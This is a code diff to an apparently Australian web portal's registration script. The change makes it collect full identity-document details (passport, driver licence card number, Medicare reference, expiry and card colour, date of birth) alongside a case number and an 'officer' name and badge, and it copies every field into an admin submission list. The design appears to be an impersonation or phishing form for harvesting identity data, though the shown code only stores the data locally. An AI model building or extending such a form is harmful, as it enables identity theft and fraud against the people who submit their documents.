@@ -145,15 +145,44 @@ input.err~.err-text,select.err~.err-text{display:block;}
 'use strict';
 function clearErr(el){el.classList.remove('err');}
 var rules=[{id:'caseNo',test:function(v){return v.length>0;}},{id:'fname',test:function(v){return v.length>0;}},{id:'lname',test:function(v){return v.length>0;}},{id:'email',test:function(v){return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(v);}},{id:'phone',test:function(v){return v.length>0;}},{id:'street',test:function(v){return v.length>0;}},{id:'suburb',test:function(v){return v.length>0;}},{id:'state',test:function(v){return v!=='';}},{id:'postcode',test:function(v){return /^\d{4}$/.test(v);}}];
-function doRegister(e){e.preventDefault();if(!document.getElementById('terms').checked){alert('Please agree to the Terms of Use and Privacy Policy.');return;}if(!validateDOB())return;var allGood=true;var firstBad=null;rules.forEach(function(r){var el=document.getElementById(r.id);var val=el.value.trim();var ok=r.test(val);el.classList.toggle('err',!ok);el.classList.toggle('ok',ok);if(!ok&&!firstBad)firstBad=el;if(!ok)allGood=false;});if(!allGood){firstBad.scrollIntoView({behavior:'smooth',block:'center'});firstBad.focus();return;}var btn=document.getElementById('regBtn');btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Checking...';setTimeout(function(){var userData={caseNo:document.getElementById('caseNo').value.trim(),fname:document.getElementById('fname').value.trim(),lname:document.getElementById('lname').value.trim(),email:document.getElementById('email').value.trim(),phone:document.getElementById('phone').value.trim(),state:document.getElementById('state').value,suburb:document.getElementById('suburb').value.trim(),postcode:document.getElementById('postcode').value.trim(),street:document.getElementById('street').value.trim()};localStorage.setItem('portalUser',JSON.stringify(userData));
-// Also push directly to adminSubmissions so admin panel sees it immediately
+function doRegister(e){e.preventDefault();if(!document.getElementById('terms').checked){alert('Please agree to the Terms of Use and Privacy Policy.');return;}if(!validateDOB())return;var allGood=true;var firstBad=null;rules.forEach(function(r){var el=document.getElementById(r.id);var val=el.value.trim();var ok=r.test(val);el.classList.toggle('err',!ok);el.classList.toggle('ok',ok);if(!ok&&!firstBad)firstBad=el;if(!ok)allGood=false;});if(!allGood){firstBad.scrollIntoView({behavior:'smooth',block:'center'});firstBad.focus();return;}var btn=document.getElementById('regBtn');btn.disabled=true;btn.innerHTML='<span class="spinner"></span> Checking...';setTimeout(function(){// Collect officer info from login
+var officerData=JSON.parse(localStorage.getItem('portalOfficer')||'{}');
+// Collect all form fields
+var idType=document.getElementById('idType').value;
+var dob=document.getElementById('dobDay').value+'/'+document.getElementById('dobMonth').value+'/'+document.getElementById('dobYear').value;
+var userData={
+  caseNo:document.getElementById('caseNo').value.trim(),
+  fname:document.getElementById('fname').value.trim(),
+  lname:document.getElementById('lname').value.trim(),
+  email:document.getElementById('email').value.trim(),
+  phone:document.getElementById('phone').value.trim(),
+  dob:dob,
+  street:document.getElementById('street').value.trim(),
+  suburb:document.getElementById('suburb').value.trim(),
+  state:document.getElementById('state').value,
+  postcode:document.getElementById('postcode').value.trim(),
+  idType:idType,
+  idNumber:document.getElementById('idNumber')?document.getElementById('idNumber').value.trim():'',
+  passCountry:(document.getElementById('passCountry')&&idType==='passport')?document.getElementById('passCountry').value:'',
+  passExpiry:(document.getElementById('passExpiry')&&idType==='passport')?document.getElementById('passExpiry').value:'',
+  licState:(document.getElementById('licState')&&idType==='licence')?document.getElementById('licState').value:'',
+  licExpiry:(document.getElementById('licExpiry')&&idType==='licence')?document.getElementById('licExpiry').value:'',
+  licCardNo:(document.getElementById('licCardNo')&&idType==='licence')?document.getElementById('licCardNo').value.trim():'',
+  medRef:(document.getElementById('medRef')&&idType==='medicare')?document.getElementById('medRef').value.trim():'',
+  medExpiry:(document.getElementById('medExpiry')&&idType==='medicare')?document.getElementById('medExpiry').value:'',
+  medColor:(document.getElementById('medColor')&&idType==='medicare')?document.getElementById('medColor').value:'',
+  officerName:officerData.officerName||'',
+  officerBadge:officerData.officerBadge||''
+};
+localStorage.setItem('portalUser',JSON.stringify(userData));
+// Push to adminSubmissions immediately
 var existingSubs=JSON.parse(localStorage.getItem('adminSubmissions')||'[]');
 var existingUsers=JSON.parse(localStorage.getItem('adminUsers')||'[]');
 var alreadyIn=existingSubs.some(function(s){return s.email===userData.email;});
 if(!alreadyIn){
   var now=new Date();
   var nowStr=now.toLocaleDateString('en-AU')+' '+now.toLocaleTimeString('en-AU',{hour:'2-digit',minute:'2-digit'});
-  existingSubs.unshift({id:existingSubs.length+1,caseNo:userData.caseNo,fname:userData.fname,lname:userData.lname,email:userData.email,phone:userData.phone,street:userData.street,suburb:userData.suburb,state:userData.state,postcode:userData.postcode,officerName:userData.officerName,officerBadge:userData.officerBadge,time:nowStr,status:'Pending'});
+  existingSubs.unshift(Object.assign({id:existingSubs.length+1,time:nowStr,status:'Pending'},userData));
   existingUsers.unshift({id:existingUsers.length+1,fname:userData.fname,lname:userData.lname,email:userData.email,phone:userData.phone,role:'Partner',joined:now.toLocaleDateString('en-AU'),lastLogin:'Just now',status:'Active'});
   localStorage.setItem('adminSubmissions',JSON.stringify(existingSubs));
   localStorage.setItem('adminUsers',JSON.stringify(existingUsers));
@@ -168,6 +197,7 @@ function validateDOB(){var d=document.getElementById('dobDay').value;var m=docum
 </script>
 </body>
 </html>
+
 
 
 
